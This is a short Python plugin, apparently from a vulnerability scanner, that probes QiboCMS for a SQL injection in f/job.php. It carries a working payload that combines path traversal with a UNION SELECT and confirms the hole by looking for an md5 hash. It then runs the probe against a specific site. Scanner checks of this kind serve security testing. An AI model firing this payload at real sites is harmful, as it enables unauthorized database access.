#!/usr/bin/env python
# -*- coding: utf-8 -*-

def assign(service,arg):
	if service == "qibocms":
		return True, arg

def audit(arg):
	payload = "f/job.php?job=getzone&typeid=zone&fup=..\..\do\js&id=514125&webdb[web_open]=1&webdb[cache_time_js]=-1&pre=qb_label%20where%20lid=-1%20UNION%20SELECT%201,2,3,4,5,6,0,md5(233),9,10,11,12,13,14,15,16,17,18,19%23"
	url = arg + payload
	code, head, res, errcode,finalurl =  curl.curl('"%s"' % url)

	if code == 200:
		if 'e165421110ba03099a1c0393373c5b43' in res:
			security_hole(url)

if __name__ == "__main__":
	from dummy import *
	audit(assign('qibocms', 'http://www.bangniban.cc/')[1])
